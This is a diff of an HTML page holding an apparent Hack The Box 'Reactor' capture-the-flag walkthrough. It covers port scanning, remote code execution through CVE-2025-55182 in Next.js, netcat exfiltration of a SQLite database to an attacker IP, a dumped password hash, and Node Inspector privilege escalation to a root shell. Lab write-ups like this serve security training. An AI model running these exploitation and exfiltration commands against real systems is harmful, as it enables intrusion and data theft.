@@ -38,16 +38,15 @@
 </head>
 <body>
 <div class="container">
-
-    <h1>🚀 HTB Reactor - Complete Walkthrough</h1>
-
     <div class="meta-info">
         <span><strong>Machine:</strong> Reactor</span>
-        <span><strong>Difficulty:</strong> 🟢 Easy</span>
-        <span><strong>OS:</strong> 🐧 Linux (Ubuntu 24)</span>
+        <span><strong>Difficulty:</strong> Easy</span>
+        <span><strong>OS:</strong> Linux (Ubuntu 24)</span>
         <span><strong>CVEs:</strong> CVE-2025-55182</span>
         <span><strong>Stack:</strong> Next.js 15.0.3, SQLite, Node.js Inspector</span>
     </div>
+
+    <h1>🚀 HTB Reactor - Complete Walkthrough</h1>
 
     <h2>📋 Attack Chain Overview</h2>
     <div class="attack-chain">
@@ -68,7 +67,7 @@
     <pre><code>nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
 nmap -sVC -p 22,3000 $TARGET -oN service</code></pre>
 
-    <h4>Key Findings:</h4>
+    <p>Key Findings:</p>
     <table>
         <tr><th>Port</th><th>Service</th><th>Version</th></tr>
         <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.6p1</td></tr>
@@ -87,11 +86,12 @@ nmap -sVC -p 22,3000 $TARGET -oN service</code></pre>
     </ul>
 
     <h2>🎯 Initial Access — CVE-2025-55182</h2>
+
     <p><span class="cve-tag">CVE-2025-55182</span> React2Shell RCE</p>
 
     <h3>Vulnerability Check</h3>
     <pre><code>python3 scanner.py -u http://$TARGET:3000 --safe-check
-[VULNERABLE] http://$TARGET:3000\</code\>\</pre\>
+# [VULNERABLE] http://$TARGET:3000\</code\>\</pre\>
 
     <h3>Exploitation</h3>
     <pre><code>python3 exploit.py -u http://$TARGET:3000 --cmd "id"
@@ -104,11 +104,12 @@ nmap -sVC -p 22,3000 $TARGET -oN service</code></pre>
     <h2>🏁 User Flag</h2>
 
     <h3>Exfiltrate SQLite Database</h3>
-    <pre><code># On victim
-nc 10.10.15.73 80 < /opt/reactorwatch/reactor.db
 
-# On attacker
-nc -lvnp 80 > reactor.db</code></pre>
+    <p>On the victim:</p>
+    <pre><code>nc 10.10.15.73 80 < /opt/reactorwatch/reactor.db</code></pre>
+
+    <p>On the attacker:</p>
+    <pre><code>nc -lvnp 80 > reactor.db</code></pre>
 
     <pre><code>sqlite3 reactor.db "SELECT * FROM users;"
 # 1|admin|a203b22191d744a4e70ada5c101b17b8
@@ -141,24 +142,23 @@ print(ws.recv())
 ws.close()
 "</code></pre>
 
-    <h3>Root Shell</h3>
-    <pre><code>/tmp/rootbash -p
+    <div class="box success">
+        <pre><code>/tmp/rootbash -p
 cat /root/root.txt</code></pre>
+    </div>
 
     <h2>📊 Key Takeaways</h2>
     <ul>
-        <li><strong>Next.js Versioning Matters</strong> — 15.0.3 vulnerable to React2Shell</li>
-        <li><strong>Oracle Identification</strong> — 500 errors with <code>E{"digest"</code> indicate vulnerability</li>
-        <li><strong>Database Scavenging</strong> — Check <code>/opt/</code> for .db files</li>
-        <li><strong>Internal Sockets</strong> — Node Inspector on 127.0.0.1 is a trivial PrivEsc vector</li>
+        <li><strong>Next.js versioning matters.</strong> 15.0.3 is vulnerable to React2Shell.</li>
+        <li><strong>Oracle identification.</strong> 500 errors with <code>E{"digest"</code> indicate vulnerability.</li>
+        <li><strong>Database scavenging.</strong> Check <code>/opt/</code> for .db files.</li>
+        <li><strong>Internal sockets.</strong> Node Inspector on 127.0.0.1 is a trivial PrivEsc vector.</li>
     </ul>
 
     <div class="nav-buttons">
         <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
     </div>
-
     <div class="footer">NIGHT PULSE X • 2026</div>
-
 </div>
 </body>
 </html>
